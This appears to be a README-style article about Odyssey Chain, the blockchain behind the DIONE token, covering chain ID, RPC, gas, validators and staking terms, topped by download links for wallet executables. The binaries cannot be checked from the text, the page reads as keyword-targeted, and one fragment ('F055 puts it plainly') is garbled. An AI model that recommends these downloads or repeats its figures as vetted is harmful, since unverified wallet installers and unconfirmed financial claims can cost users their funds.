![DIONE Wallet](assets/banner-article.png)

# How Odyssey Chain Powers DIONE

<p align="center">Chain ID, RPC and what runs on it</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

Odyssey Chain is the blockchain DIONE runs on: chain ID 153153, an EVM-compatible network launched in November 2024, with its own RPC endpoint, block explorer, validator set and staking programme. DIONE is its native asset, which is why every wallet action ends in a chain transaction.

## The four identifiers

If you know nothing else about the chain, know these, because they appear in every configuration screen:

| What | Value |
| --- | --- |
| Chain ID | 153153 |
| RPC endpoint | https://node.dioneprotocol.com/ext/bc/D/rpc |
| Block explorer | https://odysseyscan.com |
| Native asset | DIONE, 18 decimals |

A wallet pointed at those four is on Odyssey Chain. A wallet pointed at anything else is not, which is the single most common cause of a "missing" balance. The chain ID is high, 153153, for one reason: EVM chain IDs only have to be unique, and a large number is far less likely to collide with another network than a small one.

Odyssey Chain can be added to MetaMask with the same four fields. Why does MetaMask warn when you add Odyssey? Because adding a network means trusting the endpoint it points at, and a hostile endpoint can show a false balance; the warning is about that trust, not about this chain.

## Why DIONE needed its own chain

As an ERC-20 token, DIONE existed inside Ethereum's fee market: every transfer competed with every other Ethereum transaction, and a busy day made ordinary use expensive. It also meant DIONE's rules were a contract's rules, amendable only by whoever controlled the contract.

A native chain changes both. Fees are paid in the asset being used, set by that chain's own demand, and the parameters that matter - staking rewards, unbonding, the validator set - are protocol rules rather than an application's settings.

That is the substance behind "native": not a marketing upgrade, but a change in who sets the terms.

## An EVM chain, built on Avalanche's stack

Odyssey is EVM-compatible through Coreth, the Ethereum Virtual Machine implementation Avalanche uses, and its consensus derives from Avalanche's. In practice that means two things:

- **Ethereum tooling works.** Contract addresses, ABIs, familiar transaction semantics and EVM wallets all apply.
- **The chain's architecture follows a three-chain pattern**, with responsibilities divided: Delta for assets, Alpha for trading, and Omega for contracts.

The division exists to keep the contract layer from being slowed by everything else. A chain that runs only smart contracts has one queue; splitting the roles gives each part of the system its own.

F055 puts it plainly: the EVM is Coreth. Everything a Solidity developer expects works, because it is the same implementation. Why did DIONE fork Avalanche instead of using Ethereum as its base? Because a dedicated chain needs a consensus and blockspace it does not share, and Avalanche's design pairs an EVM with a consensus and subnet structure a chain can adopt.

An address on Odyssey Chain looks like any EVM address: 0x followed by forty hexadecimal characters, identical in shape to an Ethereum address, which is why the network and not the address tells you where a balance lives.

## Gas, and what it costs

Every transaction on Odyssey Chain costs a fee in DIONE: a transfer, a delegation, a claim, an approval, a swap. The fee is small in ordinary use, and it is the reason a wallet needs a balance outside its stake.

Two practical consequences, both of which show up in support conversations:

- **Staking everything leaves no fee.** A delegation that bonds the entire balance cannot pay for its own unbonding later.
- **A bridged-in asset without DIONE is stranded.** The asset arrives, and nothing can move until some DIONE is present to pay for it.

[Odyssey Chain Gas Fees Inside DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/odyssey-chain-gas-fees-in-dione-wallet.md) covers the fee market in detail.

## The validator set, and why it matters to a holder

Odyssey Chain secures itself with Orion validators, ranked on the OBOL leaderboard by uptime, blocks produced and delegation, with bonus rewards for the top hundred. Delegators attach DIONE to a validator and share in its rewards.

That mechanism is the chain's, not the wallet's: the wallet is the interface where you choose a validator and sign a delegation transaction. The programme's terms - a 1% base reward per 30-day period with an 8% annual maximum, a 10,000 DIONE minimum, a 10-day unbonding period - are protocol parameters.

[How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md) is the practical route, and [Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md) the choice.

## What the explorer gives you

OdysseyScan is the chain's public record: transactions, addresses, balances, validator activity and block production. It is the authority when a wallet disagrees with reality, because it reads the chain directly rather than through a wallet's display layer.

That makes it the first stop for any of the ordinary confusions - a transfer that "did not arrive", a balance that looks wrong, a staking transaction that seems to have vanished. The transaction is either there or it is not, and the explorer answers in seconds.

## What the chain does not do

It does not hold your keys, and it cannot restore them. It does not run a login: there are no accounts on Odyssey Chain in the sense a web application means, only addresses and signatures.

If DIONE still shows on Ethereum after adding Odyssey, that is expected: the ERC-20 balance and the native balance are two different assets on two different chains, and adding a network converts nothing.

It also does not manage your wallet software. A chain can be perfectly healthy while an app on your machine is stale, misconfigured or pointed at the wrong endpoint - which is why the diagnostic order in [DIONE Wallet Transaction Failed: Read the Error, Then Act](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-transaction-failed.md) starts with the wallet and ends with the chain.

## The relationship in one paragraph

The chain provides consensus, fees and staking; the token pays for all three; the wallet is the interface where a person acts. Every article about DIONE Wallet is ultimately about talking to Odyssey Chain correctly, and every problem resolves into one of the three: the app, the connection, or the chain itself.

That framing is worth keeping, because it turns most confusion into a question with an answer - which of the three is misbehaving, and what would prove it?

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Chain parameters are set by the protocol; the screens that display them come from the app. A build that is behind can show stale staking figures or miss a network change, so install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before concluding the chain did something unexpected.

## FAQ

### What is Odyssey Chain?

The EVM-compatible blockchain DIONE runs on, launched in November 2024 with chain ID 153153, its own RPC endpoint, explorer and validator set.

### What is the Odyssey Chain chain ID?

153153. It is the field that decides whether a wallet is talking to the right network.

### Does Odyssey Chain support Ethereum tools?

Yes - the EVM is Coreth, the implementation Avalanche uses, so contract addresses, ABIs and EVM tooling apply.

### Why does DIONE need its own chain?

So fees, staking and protocol parameters are set by the chain's own rules rather than by an Ethereum contract and Ethereum's fee market.

### How does Odyssey Chain relate to DIONE Wallet?

The wallet is the interface; the chain is the record. A display problem is a wallet issue, and a confirmation problem is a chain one.

The chain sets the terms, the token pays for them, and the wallet is where you act - three layers that explain almost every symptom. The fees are in [Odyssey Chain Gas Fees Inside DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/odyssey-chain-gas-fees-in-dione-wallet.md), the protocol itself in [What Is DIONE Protocol?](https://github.com/dione-protocol/staking-and-network/blob/main/what-is-dione-protocol.md), and the staking terms in [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md).
